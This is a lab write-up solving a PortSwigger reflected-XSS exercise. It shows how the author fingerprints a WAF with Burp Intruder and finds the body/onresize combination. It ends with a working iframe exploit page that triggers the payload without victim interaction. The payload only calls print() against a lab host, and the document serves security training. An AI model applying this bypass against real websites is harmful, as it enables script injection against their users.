# Reflected XSS into HTML Context with Most Tags and Attributes Blocked

## Lab Description

This PortSwigger Web Security Academy lab demonstrates reflected Cross-Site Scripting (XSS) in an HTML context where most tags and attributes are blocked by a Web Application Firewall (WAF).

The goal was to bypass the restrictions, find an allowed HTML element and event handler, and execute JavaScript without requiring the victim to interact with the page.

## Solution

### 1. Testing the Search Functionality

I started by searching for `test123` and observed that the input was reflected in the page heading:

```html
<h1>0 search results for 'test123'</h1>
```

The response showed that the search value was included in the HTML returned by the application.

<p>
<img src="images/Screenshot 1.png" alt="Screenshot 1 - Testing the search functionality with test123">
</p>

### 2. Checking How Special Characters Were Reflected

Next, I tested the input:

```text
test< " ' >
```

In Burp Suite's raw response, I found the following line:

```html
<h1>0 search results for 'test< " ' >'</h1>
```

The angle brackets and quotation marks appeared unchanged in the response. This indicated that these characters were reflected without being HTML-encoded in this response.

However, this observation alone did not prove the presence of a WAF. I needed to test HTML tags and attributes to understand the application's restrictions.

<p>
<img src="images/Screenshot 2.png" alt="Screenshot 2 - Inspecting special characters in the raw HTTP response">
</p>

### 3. Identifying the WAF Restrictions

I tried an HTML injection payload containing an event handler:

```html
test<TAG src=1 onerror=print()>
```

The application returned:

```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8

"Attribute is not allowed"
```

I also tested:

```html
test<script>
```

This time, the response indicated:

```text
Tag is not allowed
```

These responses showed that the application was applying restrictions to HTML tags and attributes. Rather than guessing which combinations were allowed, I decided to investigate systematically.

<p>
<img src="images/Screenshot 3.png" alt="Screenshot 3 - WAF rejecting an HTML attribute in Burp Suite">
</p>

### 4. Using Burp Intruder to Test HTML Tags

I sent the search request to Burp Intruder and used the PortSwigger XSS Cheat Sheet as a source of candidate HTML tags.

I tested tags such as:

```html
<h1 src=1 onerror=print()>
<img src=1 onerror=print()>
<body src=1 onerror=print()>
<foo src=1 onerror=print()>
```

Most of the tested tags returned `Tag is not allowed`. However, some candidates, including `body`, `foo`, and `xss`, produced a different response: `Attribute is not allowed`.

This distinction helped me narrow down the tags that the filter treated differently.

Reference: [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

<p>
<img src="images/Screenshot 4.png" alt="Screenshot 4 - Using Intruder to compare WAF responses for different tags">
</p>

### 5. Finding Tags That the Filter Accepted

I then tested tag names without the attributes that had caused rejection.

Some inputs, including `body`, `foo`, `xss`, and `tag`, returned HTTP 200 responses.

This suggested that the filter accepted these inputs as tag names. However, a successful status code alone did not prove that a tag could execute JavaScript. I still needed to test which attributes were accepted and how the browser handled them.

<p>
<img src="images/Screenshot 5.png" alt="Screenshot 5 - Identifying tag names that returned HTTP 200">
</p>

### 6. Testing Attributes on an Accepted Tag

After identifying accepted tag names, I tested whether attributes could be included.

For example:

```html
before <tag first=blah second=blah> after
```

The request was accepted, which helped me understand that the application did not reject every tag containing attributes. The result depended on the specific tag and attribute combination.

I then tried an event handler:

```html
before <tag oninput=print(1)> after
```

The application responded with `Attribute is not allowed`.

This showed that I needed to identify an event-handler attribute accepted by the filter rather than assuming that any event handler would work.

<p>
<img src="images/Screenshot 6.png" alt="Screenshot 6 - Testing attributes on a tag accepted by the filter">
</p>

### 7. Finding an Allowed Event Handler

I used Burp Intruder again, this time testing candidate event-handler attributes. I compared the responses to find attributes that did not trigger the WAF's rejection message.

Among the candidates, `onresize` was accepted.

At this stage, I had identified a promising combination, but I still needed a way to trigger the resize event automatically. An accepted event-handler attribute does not execute just because it appears in the HTML.

<p>
<img src="images/Screenshot 7.png" alt="Screenshot 7 - Using Intruder to identify event-handler attributes accepted by the WAF">
</p>

### 8. Triggering the Resize Event with an Exploit Page

I used the exploit server to host an HTML page containing an iframe. The iframe loaded the vulnerable lab URL with a crafted search parameter.

The important payload used the `body` element and its `onresize` handler:

```html
<body onresize=print()>
```

I then made the iframe change its width when it finished loading:

```html
<iframe
  src="https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cbody%20onresize%3Dprint%28%29%3E"
  onload="this.style.width='100px'">
</iframe>
```

I replaced `YOUR-LAB-ID` with the current lab host.

The iframe's `onload` handler runs after the embedded page loads. It changes the iframe's width, changing the embedded viewport and triggering the resize behavior needed by the payload.

The chain was:

1. The victim opens the exploit URL.
2. The exploit page loads the vulnerable lab page inside an iframe.
3. The injected HTML provides the `body` element with an `onresize` handler.
4. The iframe's width changes automatically after loading.
5. The resize event triggers `print()`, demonstrating JavaScript execution.

I tested the exploit using **View exploit** and then used **Deliver exploit to victim** to complete the lab.

<p>
<img src="images/Screenshot 8.png" alt="Screenshot 8 - Successful XSS execution after the iframe triggers the resize event">
</p>

## Root Cause

The application reflected user-controlled search input into an HTML context while relying on a filter that blocked many, but not all, HTML tags and attributes.

By identifying an accepted HTML element and event-handler attribute, I was able to construct input that the browser interpreted as active HTML rather than harmless text. The exploit server then triggered the resize event automatically.

The underlying issue was insufficiently robust handling of untrusted input in an HTML context. A WAF filter alone is not a reliable replacement for context-appropriate output encoding and secure HTML handling.

## Key Takeaway

This lab taught me to investigate reflected XSS systematically instead of relying on common payloads.

- Inspect the raw HTTP response to understand how input is reflected.
- Distinguish output encoding from WAF filtering.
- Use Burp Intruder to test tags and attributes efficiently.
- Do not assume that HTTP 200 means a payload is executable.
- Consider the browser's parsing rules and event behavior, not just the server's response.
- Understand how an exploit page can trigger an event automatically without requiring the victim to interact with the vulnerable page.

## Final Payload

Injected HTML:

```html
<body onresize=print()>
```

Exploit server body:

```html
<iframe
  src="https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cbody%20onresize%3Dprint%28%29%3E"
  onload="this.style.width='100px'">
</iframe>
```

Replace `YOUR-LAB-ID` with the current lab host before using the payload. The lab-specific host can change when a new instance is started.
